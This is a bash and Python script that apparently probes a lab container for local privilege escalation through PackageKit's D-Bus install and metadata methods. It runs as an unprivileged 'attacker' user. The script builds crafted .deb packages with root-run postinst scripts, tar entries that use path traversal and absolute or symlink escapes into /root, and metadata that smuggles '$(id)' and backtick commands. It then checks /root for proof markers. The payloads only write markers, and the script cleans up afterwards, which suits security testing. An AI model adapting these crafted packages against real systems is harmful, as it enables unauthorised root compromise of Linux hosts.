#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${TARGET:-ubuntu24-server-lpe-target}"
ATTACKER="${ATTACKER:-attacker}"
SELFAUTH="${SELFAUTH:-selfauth}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/packagekit-local-deb-parser.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

target_root() {
  run docker exec "$TARGET" bash -lc "$1"
}

as_user() {
  local user="$1"
  local cmd="$2"
  run docker exec "$TARGET" runuser -u "$user" -- bash -lc "$cmd"
}

echo "PackageKit local .deb parser/metadata probe"
echo "target=$TARGET attacker=$ATTACKER selfauth=$SELFAUTH"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

START_TS="$(docker exec "$TARGET" date '+%Y-%m-%d %H:%M:%S')"

target_root '
set -euo pipefail
echo "== cleanup before probe =="
dpkg -r pk-local-normal pk-local-weird pk-local-control-traversal pk-local-data-traversal 2>/dev/null || true
rm -rf /tmp/packagekit-local-deb-parser
rm -f /root/packagekit_local_deb_parser_*
systemctl reset-failed packagekit.service polkit.service dbus.service 2>/dev/null || true
'

target_root '
set -euo pipefail
echo "== target identity and package versions =="
cat /etc/os-release
uname -a
id attacker
id selfauth || true
dpkg-query -W -f="\${binary:Package}\t\${Version}\t\${Architecture}\n" \
  packagekit packagekit-tools libpackagekit-glib2-18 gir1.2-packagekitglib-1.0 \
  python3-gi polkitd dbus dbus-daemon systemd dpkg tar xz-utils 2>&1 | sort
echo
echo "== PackageKit service/default D-Bus reachability =="
systemctl cat packagekit.service
ls -l /run/dbus/system_bus_socket /var/run/dbus/system_bus_socket 2>/dev/null || true
busctl --system list | grep -E "org.freedesktop.(PackageKit|PolicyKit1)|polkit" || true
echo
echo "== PackageKit transaction methods =="
sed -n "422,466p;739,780p" /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml
echo
echo "== package install policy =="
grep -n -A8 -B3 "package-install-untrusted" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy | sed -n "1,80p"
'

for user in "$ATTACKER" "$SELFAUTH"; do
  as_user "$user" '
set -euo pipefail
echo "== user reachability: $(id) =="
loginctl user-status "$(id -u)" 2>&1 | sed -n "1,30p" || true
pkcheck --action-id org.freedesktop.packagekit.package-install-untrusted --process "$$" 2>&1 || true
tx=$(gdbus call --system \
  --dest org.freedesktop.PackageKit \
  --object-path /org/freedesktop/PackageKit \
  --method org.freedesktop.PackageKit.CreateTransaction |
  sed -n "s/.*objectpath '\''\([^'\'' ]*\)'\''.*/\1/p")
echo "transaction=$tx"
gdbus call --system \
  --dest org.freedesktop.PackageKit \
  --object-path "$tx" \
  --method org.freedesktop.DBus.Properties.GetAll \
  org.freedesktop.PackageKit.Transaction
gdbus introspect --system \
  --dest org.freedesktop.PackageKit \
  --object-path "$tx" |
  sed -n "/GetDetailsLocal/,/InstallFiles/p"
'
done

as_user "$ATTACKER" '
set -Eeuo pipefail
work=/tmp/packagekit-local-deb-parser
rm -rf "$work"
mkdir -p "$work"/{normal,normal/DEBIAN,normal/usr/local/share/packagekit-local-deb-parser,weird,weird/DEBIAN,weird/usr/local/share/packagekit-local-deb-parser,manual}

cat > "$work/normal/DEBIAN/control" <<\EOF
Package: pk-local-normal
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: Parser Probe <probe@example.invalid>
Description: normal local parser package
 Confirms metadata parsing does not run maintainer scripts.
EOF
cat > "$work/normal/DEBIAN/postinst" <<\EOF
#!/bin/sh
set -eu
{
  echo normal-postinst-ran
  date -Is
  id
} > /root/packagekit_local_deb_parser_postinst
chmod 0600 /root/packagekit_local_deb_parser_postinst
EOF
chmod 0755 "$work/normal/DEBIAN/postinst"
printf "normal payload\n" > "$work/normal/usr/local/share/packagekit-local-deb-parser/payload.txt"
dpkg-deb --build "$work/normal" "$work/pk-local-normal.deb"

cat > "$work/weird/DEBIAN/control" <<\EOF
Package: pk-local-weird
Version: 1.0+meta~probe
Section: misc
Priority: optional
Architecture: all
Maintainer: Weird, Parser <probe@example.invalid>
Homepage: file:///tmp/packagekit-local-deb-parser/%0a/root/packagekit_local_deb_parser_homepage
Description: weird local metadata package with parser punctuation
 Continuation line with semicolons ;;;;;, percent escapes %n %s %x,
 unicode-looking bytes kept ascii, shell-looking text $(id), backticks `id`,
 and absolute paths /root/packagekit_local_deb_parser_metadata.
 .
 Final paragraph for multiline metadata.
EOF
cat > "$work/weird/DEBIAN/postinst" <<\EOF
#!/bin/sh
id > /root/packagekit_local_deb_parser_weird_postinst
EOF
chmod 0755 "$work/weird/DEBIAN/postinst"
printf "weird payload\n" > "$work/weird/usr/local/share/packagekit-local-deb-parser/weird.txt"
dpkg-deb --build "$work/weird" "$work/pk-local-weird.deb"

python3 - <<\PY
import io
import os
import tarfile
import time

work = "/tmp/packagekit-local-deb-parser"

def tar_blob(entries):
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w") as tf:
        for name, data, mode, typ in entries:
            ti = tarfile.TarInfo(name)
            ti.mode = mode
            ti.uid = 0
            ti.gid = 0
            ti.mtime = 1710000000
            if typ == "file":
                payload = data.encode()
                ti.size = len(payload)
                tf.addfile(ti, io.BytesIO(payload))
            elif typ == "symlink":
                ti.type = tarfile.SYMTYPE
                ti.linkname = data
                tf.addfile(ti)
            else:
                raise ValueError(typ)
    return bio.getvalue()

def ar_member(name, data):
    encoded = name.encode()
    if len(encoded) > 15:
        raise ValueError(name)
    header = (
        encoded.ljust(16, b" ")
        + str(int(time.time())).encode().ljust(12, b" ")
        + b"0     "
        + b"0     "
        + b"100644  "
        + str(len(data)).encode().ljust(10, b" ")
        + b"`\n"
    )
    pad = b"\n" if len(data) % 2 else b""
    return header + data + pad

def write_deb(path, control_entries, data_entries):
    blob = b"!<arch>\n"
    blob += ar_member("debian-binary", b"2.0\n")
    blob += ar_member("control.tar", tar_blob(control_entries))
    blob += ar_member("data.tar", tar_blob(data_entries))
    with open(path, "wb") as f:
        f.write(blob)
    os.chmod(path, 0o644)

base_control = """Package: pk-local-control-traversal
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: Parser Probe <probe@example.invalid>
Description: control tar traversal parser package
 Attempts to prove whether root PackageKit extracts control members unsafely.
"""

write_deb(
    os.path.join(work, "pk-local-control-traversal.deb"),
    [
        ("./control", base_control, 0o644, "file"),
        ("./postinst", "#!/bin/sh\nid > /root/packagekit_local_deb_parser_control_postinst\n", 0o755, "file"),
        ("../../root/packagekit_local_deb_parser_control_parent_escape", "control parent escape\n", 0o600, "file"),
        ("/root/packagekit_local_deb_parser_control_absolute_escape", "control absolute escape\n", 0o600, "file"),
        ("./control-symlink", "/root/packagekit_local_deb_parser_control_symlink_escape", 0o777, "symlink"),
    ],
    [("./usr/local/share/packagekit-local-deb-parser/control.txt", "control traversal payload\n", 0o644, "file")],
)

base_control = """Package: pk-local-data-traversal
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: Parser Probe <probe@example.invalid>
Description: data tar traversal parser package
 Attempts to prove whether metadata/file-list code extracts data members unsafely.
"""

write_deb(
    os.path.join(work, "pk-local-data-traversal.deb"),
    [
        ("./control", base_control, 0o644, "file"),
        ("./postinst", "#!/bin/sh\nid > /root/packagekit_local_deb_parser_data_postinst\n", 0o755, "file"),
    ],
    [
        ("./usr/local/share/packagekit-local-deb-parser/data.txt", "data traversal payload\n", 0o644, "file"),
        ("../../root/packagekit_local_deb_parser_data_parent_escape", "data parent escape\n", 0o600, "file"),
        ("/root/packagekit_local_deb_parser_data_absolute_escape", "data absolute escape\n", 0o600, "file"),
    ],
)
PY

ls -l "$work"/*.deb
for deb in "$work"/*.deb; do
  echo "== dpkg-deb metadata for $deb =="
  dpkg-deb -I "$deb" 2>&1 | sed -n "1,80p" || true
  echo "== dpkg-deb contents for $deb =="
  dpkg-deb -c "$deb" 2>&1 | sed -n "1,80p" || true
done
'

run docker exec -i "$TARGET" bash -lc "cat > /tmp/packagekit-local-deb-parser/pk_local_parser_driver.py && chown $ATTACKER:$ATTACKER /tmp/packagekit-local-deb-parser/pk_local_parser_driver.py && chmod 0755 /tmp/packagekit-local-deb-parser/pk_local_parser_driver.py" <<'PYDRIVER'
#!/usr/bin/env python3
import sys
import time

import gi
gi.require_version("Gio", "2.0")
from gi.repository import Gio, GLib

BUS = "org.freedesktop.PackageKit"
ROOT = "/org/freedesktop/PackageKit"
ROOT_IFACE = "org.freedesktop.PackageKit"
TX_IFACE = "org.freedesktop.PackageKit.Transaction"
PROPS_IFACE = "org.freedesktop.DBus.Properties"

conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)

def call_sync(path, iface, method, params=None, timeout=5000):
    return conn.call_sync(BUS, path, iface, method, params, None, Gio.DBusCallFlags.NONE, timeout, None)

def make_tx():
    ret = call_sync(ROOT, ROOT_IFACE, "CreateTransaction")
    return ret.unpack()[0]

def tx_props(tx):
    ret = call_sync(tx, PROPS_IFACE, "GetAll", GLib.Variant("(s)", (TX_IFACE,)), 3000)
    props = ret.unpack()[0]
    interesting = {}
    for key in ("Uid", "CallerActive", "Role", "Status", "TransactionFlags"):
        if key in props:
            interesting[key] = props[key]
    return interesting

def drive(method, deb, flags=None):
    tx = make_tx()
    print(f"\n== {method} {deb} ==", flush=True)
    print(f"tx={tx} props={tx_props(tx)}", flush=True)
    try:
        call_sync(tx, TX_IFACE, "SetHints", GLib.Variant("(as)", (["interactive=false"],)), 3000)
        print("SetHints interactive=false: ok", flush=True)
    except GLib.Error as exc:
        print(f"SetHints interactive=false: {exc.message}", flush=True)

    finished = {"seen": False}
    loop = GLib.MainLoop()

    def signal_cb(_conn, _sender, path, iface, signal, params, _data):
        try:
            unpacked = params.unpack()
        except Exception as exc:
            unpacked = f"<unpack failed: {exc}>"
        print(f"signal {path} {iface}.{signal} {unpacked}", flush=True)
        if signal == "Finished":
            finished["seen"] = True
            loop.quit()

    def method_cb(source, result, label):
        try:
            source.call_finish(result)
            print(f"method_reply {label}: ok", flush=True)
        except GLib.Error as exc:
            print(f"method_reply {label}: {exc.message}", flush=True)

    sub = conn.signal_subscribe(
        BUS,
        TX_IFACE,
        None,
        tx,
        None,
        Gio.DBusSignalFlags.NONE,
        signal_cb,
        None,
    )
    try:
        if method in ("GetDetailsLocal", "GetFilesLocal"):
            params = GLib.Variant("(as)", ([deb],))
        elif method == "InstallFiles":
            params = GLib.Variant("(tas)", (int(flags), [deb]))
        else:
            raise ValueError(method)
        conn.call(
            BUS,
            tx,
            TX_IFACE,
            method,
            params,
            None,
            Gio.DBusCallFlags.NONE,
            7000,
            None,
            method_cb,
            f"{method} flags={flags}" if flags is not None else method,
        )
        conn.flush_sync(None)
        GLib.timeout_add_seconds(8, loop.quit)
        loop.run()
        if not finished["seen"]:
            print("timeout waiting for Finished", flush=True)
    finally:
        conn.signal_unsubscribe(sub)
        try:
            call_sync(tx, TX_IFACE, "Destroy", None, 1000)
        except GLib.Error:
            pass

def main(argv):
    debs = argv[1:]
    if not debs:
        raise SystemExit("usage: pk_local_parser_driver.py FILE.deb ...")
    print(f"driver uid props: system-bus connected, files={len(debs)}", flush=True)
    for deb in debs:
        for method in ("GetDetailsLocal", "GetFilesLocal"):
            drive(method, deb)
        for flags in (8, 0):
            drive("InstallFiles", deb, flags)
            time.sleep(0.5)

if __name__ == "__main__":
    main(sys.argv)
PYDRIVER

for user in "$ATTACKER" "$SELFAUTH"; do
  as_user "$user" '
set -euo pipefail
echo "== PackageKit local parser D-Bus drive as $(id) =="
/tmp/packagekit-local-deb-parser/pk_local_parser_driver.py \
  /tmp/packagekit-local-deb-parser/pk-local-normal.deb \
  /tmp/packagekit-local-deb-parser/pk-local-weird.deb \
  /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb \
  /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb
'
done

target_root '
set -euo pipefail
echo "== root proof check =="
if ls -l /root/packagekit_local_deb_parser_* 2>/dev/null; then
  for marker in /root/packagekit_local_deb_parser_*; do
    echo "--- $marker"
    sed -n "1,40p" "$marker" || true
  done
else
  echo "ROOT_MARKER_ABSENT"
fi
echo
echo "== install-state check =="
dpkg-query -W -f="\${binary:Package}\t\${Version}\t\${Status}\n" \
  pk-local-normal pk-local-weird pk-local-control-traversal pk-local-data-traversal 2>&1 || true
echo
echo "== temp/artifact check =="
find /tmp -maxdepth 2 \( -name "packagekit-local-deb-parser*" -o -name "pk-local-*" \) -print -exec ls -ld {} \; 2>/dev/null | sed -n "1,120p"
echo
echo "== daemon health =="
systemctl is-active packagekit.service polkit.service dbus.service
systemctl --failed --no-pager || true
echo
echo "== PackageKit journal since probe start =="
journalctl --no-pager -u packagekit.service --since "'"$START_TS"'" | tail -n 160 || true
'

target_root '
set -euo pipefail
echo "== cleanup =="
dpkg -r pk-local-normal pk-local-weird pk-local-control-traversal pk-local-data-traversal 2>/dev/null || true
rm -rf /tmp/packagekit-local-deb-parser
rm -f /root/packagekit_local_deb_parser_*
systemctl reset-failed packagekit.service polkit.service dbus.service 2>/dev/null || true
echo "== cleanup verification =="
ls -l /root/packagekit_local_deb_parser_* 2>/dev/null || echo "no root markers"
test ! -e /tmp/packagekit-local-deb-parser && echo "no /tmp probe directory"
dpkg-query -W pk-local-normal pk-local-weird pk-local-control-traversal pk-local-data-traversal 2>&1 || true
systemctl is-active packagekit.service polkit.service dbus.service
'
